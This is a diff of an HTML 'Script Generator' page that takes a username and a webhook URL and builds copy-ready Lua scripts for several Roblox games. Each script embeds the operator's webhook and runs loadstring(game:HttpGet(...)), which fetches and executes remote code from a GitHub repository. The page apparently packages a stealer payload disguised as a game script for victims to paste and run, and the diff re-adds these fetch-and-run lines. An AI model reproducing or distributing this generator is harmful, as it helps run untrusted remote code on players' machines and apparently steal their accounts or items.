@@ -1,83 +1,24 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Script Generator</title>
     <style>
-        /* Basic Styles */
-        body {
-            background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
-            color: white;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            flex-direction: column;
-            margin: 0;
-        }
-        h1 {
-            font-size: 3rem;
-        }
-        .container {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            margin-top: 20px;
-            text-align: center;
-        }
-        input, select, button {
-            padding: 10px;
-            border-radius: 8px;
-            border: none;
-            background-color: #333;
-            color: white;
-            font-size: 1rem;
-            width: 250px;
-        }
-        button {
-            background: #ff0080;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        button:hover {
-            background: #ff0055;
-            transform: scale(1.1);
-        }
-        /* Script Output Box */
-        #generated-script {
-            display: none;
-            background: rgba(0, 0, 0, 0.7);
-            padding: 15px;
-            border-radius: 8px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);
-            text-align: center;
-            margin-top: 20px;
-            max-width: 80%;
-            width: 100%;
-        }
-        textarea {
-            width: 100%;
-            height: 100px;
-            background: #222;
-            color: white;
-            border: none;
-            padding: 10px;
-            border-radius: 5px;
-            font-size: 1rem;
-            resize: none;
-        }
+        body{background:linear-gradient(45deg,#0f0c29,#302b63,#24243e);color:white;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;margin:0;}
+        h1{font-size:3rem;}
+        .container{display:flex;flex-direction:column;gap:15px;margin-top:20px;text-align:center;}
+        input,select,button{padding:10px;border-radius:8px;border:none;background-color:#333;color:white;font-size:1rem;width:250px;}
+        button{background:#ff0080;cursor:pointer;transition:0.3s;}
+        button:hover{background:#ff0055;transform:scale(1.1);}
+        #generated-script{display:none;background:rgba(0,0,0,0.7);padding:15px;border-radius:8px;box-shadow:0 0 15px rgba(0,0,0,0.7);text-align:center;margin-top:20px;max-width:80%;width:100%;}
+        textarea{width:100%;height:100px;background:#222;color:white;border:none;padding:10px;border-radius:5px;font-size:1rem;resize:none;}
     </style>
 </head>
 <body>
     <h1>Script Generator</h1>
-
     <div id="login-container" class="container">
         <input type="text" id="username" placeholder="Enter your Username">
         <input type="text" id="webhook" placeholder="Enter Webhook URL">
-        
-        <!-- Script Selection -->
         <select id="script-select">
             <option value="Blox Fruits">Blox Fruits</option>
             <option value="Murder Mystery 2">Murder Mystery 2</option>
@@ -85,46 +26,29 @@
             <option value="Pet Simulator 99">Pet Simulator 99</option>
             <option value="Pls Donate">Pls Donate</option>
         </select>
-        
         <button onclick="generateScript()">Generate Script</button>
     </div>
-
-    <!-- Script Output Section -->
     <div id="generated-script">
         <h2>Your Script</h2>
         <textarea id="script-output" readonly></textarea>
         <button onclick="copyScript()">Copy All</button>
     </div>
-
     <script>
-        let loadstrings = {
-            "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
-            "Murder Mystery 2": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Void'))()",
-            "Adopt Me": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/AdoptMe'))()",
-            "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Ps99'))()",
-            "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
-        };
-
-        function generateScript() {
-            let username = document.getElementById('username').value;
-            let webhook = document.getElementById('webhook').value;
-            let selectedScript = document.getElementById('script-select').value;
-
-            if (!username || !webhook) {
-                alert("Please enter both Username and Webhook URL!");
-                return;
-            }
-
-            let script = `Username = "${username}"\nWebhook = "${webhook}"\n\n${loadstrings[selectedScript]}`;
-            document.getElementById('script-output').value = script;
-            document.getElementById('generated-script').style.display = 'block';
-
-            // Hide login container after generating
-            document.getElementById('login-container').style.display = 'none';
+        let loadstrings={"Blox Fruits":"loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()","Murder Mystery 2":"loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Void'))()","Adopt Me":"loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/AdoptMe'))()","Pet Simulator 99":"loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Ps99'))()","Pls Donate":"loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"};
+        function generateScript(){
+            let username=document.getElementById('username').value;
+            let webhook=document.getElementById('webhook').value;
+            let selectedScript=document.getElementById('script-select').value;
+            if(!username||!webhook){alert("Please enter both Username and Webhook URL!");return;}
+            let script=`Username="${username}"
+Webhook="${webhook}"
+${loadstrings[selectedScript]}`;
+            document.getElementById('script-output').value=script;
+            document.getElementById('generated-script').style.display='block';
+            document.getElementById('login-container').style.display='none';
         }
-
-        function copyScript() {
-            let scriptText = document.getElementById('script-output');
+        function copyScript(){
+            let scriptText=document.getElementById('script-output');
             scriptText.select();
             document.execCommand("copy");
             alert("Script copied to clipboard!");
